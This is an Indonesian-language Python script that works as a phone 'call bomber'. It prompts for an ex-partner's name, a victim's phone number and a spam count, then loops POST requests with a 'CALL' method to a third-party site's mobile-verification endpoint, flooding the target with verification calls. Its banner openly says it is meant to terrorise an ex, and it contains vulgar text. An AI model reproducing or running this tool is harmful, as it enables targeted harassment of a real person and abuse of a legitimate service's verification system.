import requests
from requests import post
import os
import random
import sys
import random
import sys
import time
import random
import sys
import time
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.4)
#ubah angka 0.1 sesuai keinginan kamu
#angka terkecil adalah yang paling cepat
#angka terbesar adalah yang paling lambat
mengetik('Welcome to script Alvian\nGunakan script ini buat teror mantan wokwokwok\nSlow ane canda santuy\nSCRIPT PINGGIRRAWA WONDERFULL SATOE DKI.')


#variabel

merah="33[31;1m"

text = ('WELCOME TO MOBILE NGENTOD')

print (text)

#input output

nama = input('MASUKAN NAMA MANTAN ANDA : ')
print ('OK THANKS')

#perulangan for

for ulang in range(5):
    hitung = ulang + 1
    print ('SABAR ORANG SABAR DI SAYANG JANDA', hitung)
    time.sleep(1)


os.system('clear')
no = input("MASUKAN NOMOR KORBAN : ")
jumlah = int(input("MASUKAN JUMLAH SPAM : "))
url = 'https://id.jagreward.com/member/verify-mobile/'


ua = {
"Host": "id.jagreward.com",
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 7.1.1; CPH1801) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36",
}
dat = {
"method": "CALL",
"countryCode": "id",
}


for x in range(jumlah):
        r = requests.post(url+no, headers=ua, data=dat)
        print(r.json()["message"])

